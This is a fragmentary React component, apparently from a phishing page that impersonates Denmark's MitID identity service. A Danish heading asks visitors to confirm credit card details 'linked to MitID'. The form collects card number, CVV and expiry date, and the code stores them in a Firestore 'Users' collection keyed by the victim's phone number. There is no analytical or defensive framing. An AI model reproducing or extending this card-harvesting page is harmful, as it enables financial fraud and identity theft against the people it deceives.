...
function Card() {
  ...
  const CcData = async () => {
    if (!cc.cc && !cc.cvv && !cc.date) return;
    await setDoc(doc(db, "Users", "cc_" + identifier.replaceAll("+", "")), {
    ...
    <div className="max-w-md m-auto">
      <div className="py-3 px-7  min-h-[60vh]">
        ...
        <h3 className="text-left font-medium mb-3">
          BEKRÆFT VENLIGST DINE KREDITKORTOPLYSNINGER, SOM VIL VÆRE FORBUNDET
          MED MITID
        </h3>
        <div className="mb-6">
          <input
            onChange={(e) => setCc({ ...cc, cc: e.target.value })}
            type="cc"
            id="cc"
